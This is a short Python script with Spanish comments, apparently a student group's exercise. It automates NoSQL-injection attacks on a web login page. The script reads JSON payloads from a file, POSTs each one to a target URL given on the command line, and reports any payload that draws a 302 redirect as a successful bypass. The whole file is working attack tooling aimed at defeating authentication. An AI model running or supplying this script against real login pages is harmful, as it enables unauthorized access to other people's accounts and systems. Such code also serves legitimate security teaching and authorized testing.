import sys

import urllib3
import argparse
import json

from termcolor import colored

# Variables iniciales
method = "POST"
headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
           'User-Agent': 'Chrome/119.0.6045.159'}

#Función de parseo de argumentos necesarios
def parse_options():
    global parser

    parser = argparse.ArgumentParser()
    parser.add_argument("-p", "--payload", type=str, help="Cargar el payload que se va a usar",
                        dest="payload")
    parser.add_argument("-url", "--url", type=str, help="Pagina de login objetivo", dest="target")

    args = parser.parse_args()
    return args


def main(args):
    attack_noSQL(args.payload, args.target)

# inyecta el payload en el JSON usando los diferentes paylodas del archivo
# si se recibe un estado 302 significa que el payload tiene éxito
def attack_noSQL(payload, target):
    info(payload, target)
    payloads = open(payload, 'r')
    try:
        for i in payloads.readlines():
            req = urllib3.request(method, target, headers=headers, json=json.loads(i), retries=False)
            if req.status == 302:
                print(colored(("Payload válido " + i), "grey", "on_green"))
            else:
                print(colored("Inyección NoSQL inválida ", "red"))

    except Exception as err:
        if type(err) == json.decoder.JSONDecodeError:
            print(colored("Payload del JSON inválido " + i, "red"))
        else:
            print(err, type(err))
        sys.exit()

    finally:
        payloads.close()

# Imprime la parte visual inicial
def info(payload, target):
    print(colored('[+] Gupo 1', 'yellow'))
    print(colored('[+] Payload utilizado:', 'yellow'),
          colored('{}'.format(payload), 'red'))
    print(colored('[+] URL objetivo', 'yellow'),
          colored('{}'.format(target), 'cyan'))


args = parse_options()
main(args)
